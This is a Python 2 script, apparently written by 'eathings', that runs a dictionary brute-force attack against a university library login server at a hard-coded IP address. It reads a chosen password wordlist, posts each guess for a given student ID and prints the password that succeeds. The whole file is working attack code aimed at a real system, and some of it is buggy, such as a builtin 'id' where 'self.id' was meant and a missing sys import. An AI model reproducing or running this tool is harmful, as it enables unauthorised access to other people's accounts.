#!/usr/bin/env python
#coding:utf-8
#By eathings
 
import urllib
import urllib2
import cookielib
from time import sleep
import multiprocessing
import re
 
class whu_crack(multiprocessing.Process):
    def __init__(self, id, psw):
        self.id = id
        self.psw = psw
        self.title = re.compile(('<span class.*>.*?</span>'))
 
    def start_crack(self):
        cnt = 0
        for password in self.psw:
            try:
                cnt += 1
                if cnt % 1 == 0:
                    print password
                cookie = cookielib.CookieJar()
                opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cookie))
                url = 'http://202.116.64.108:8991/F/KVPPSTQH1I2F9QXF5L6ED1HN878JHS4V829EY5X912MMG6P1V6-52255'
                data = {
                        'func': 'login-session',
                        'login_source': 'bor-info',
                        'bor_id': str(id),
                        'bor_verification': str(password),
                        'bor_library': 'ZSU50',
                        }
                postdata = urllib.urlencode(data)
                req = urllib2.Request(url,postdata)
                result = opener.open(req)
                page = result.read()
                info = re.findall(self.title , page)
   #             f = open('html_correct.txt','w')
   #             f.write(page)                
   #             print info
   #             sleep(100)
   #             print info
                try:
                    if len(info[0]) > 0    :
                        print password, u'right'
                        print info[0]
                        xx = raw_input()
                    sys.exit(1)
                except:
                    pass
            except Exception, e:
                print "Error"
 
if __name__ == "__main__":
    id = raw_input('enter student id:')
    flag = raw_input("which dictionary you want to use, enter the number : ")
    dict = 'dict' + flag + '.txt'
    file = open(dict)#暴力字典
    lines = []
    for line in file:
        lines.append(line.rstrip())
    file.close()
    p = whu_crack(id, lines)
    p.start_crack()
#    num = 25
 #   print len(lines)
 #   block = len(lines)/num
 #   jobs = []
 #   for i in range(num):
  #      if i == num:
  #          psw = lines[block*i:]
   #     else:
  #          psw = lines[block*i : block*(i+1)]
  #      p = whu_crack(psw)
  #      jobs.append(p)
 #       p.start_crack()
  # for i in jobs:
  #      j.join()